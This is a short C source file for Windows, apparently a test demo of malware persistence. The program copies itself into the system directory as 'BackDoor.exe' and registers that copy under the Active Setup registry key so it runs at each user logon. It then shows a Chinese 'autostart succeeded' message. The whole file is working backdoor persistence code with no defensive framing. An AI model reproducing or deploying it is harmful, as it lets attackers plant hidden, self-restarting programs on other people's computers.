#include <windows.h>

#define REG_PATH "software\\microsoft\\active setup\\" \
                 "Installed Components\\{E0EDB497-B2F5-4b4f-97EC-2362BC4CC50D}"

int main()
{
    HKEY hKey;

    LONG lRet = RegOpenKeyEx(HKEY_CURRENT_USER,
                    REG_PATH,
                    REG_OPTION_NON_VOLATILE,
                    KEY_ALL_ACCESS,
                    &hKey);

    if ( lRet != ERROR_SUCCESS )
    {
        char szSelfFile[MAX_PATH] = { 0 };
        char szSystemPath[MAX_PATH] = { 0 };

        GetSystemDirectory(szSystemPath, MAX_PATH);
        strcat(szSystemPath, "\\BackDoor.exe");

        GetModuleFileName(NULL, szSelfFile, MAX_PATH);

        CopyFile(szSelfFile, szSystemPath, FALSE);

        lRet = RegCreateKeyEx(HKEY_LOCAL_MACHINE, 
                            REG_PATH,
                            0,
                            NULL,
                            REG_OPTION_NON_VOLATILE,
                            KEY_ALL_ACCESS,
                            NULL,
                            &hKey,
                            NULL);
    
        if ( lRet != ERROR_SUCCESS )
        {
            return -1;
        }

        lRet = RegSetValueEx(hKey, "stubpath", 0, REG_SZ, 
                             (CONST BYTE *)szSystemPath, 
                             strlen(szSystemPath));

        if ( lRet != ERROR_SUCCESS )
        {
            RegCloseKey(hKey);
            return -1;
        }
    }

    RegCloseKey(hKey);

    RegDeleteKey(HKEY_CURRENT_USER, REG_PATH);

    MessageBox(NULL, "自启动成功", "测试", MB_OK);

    return 0;
}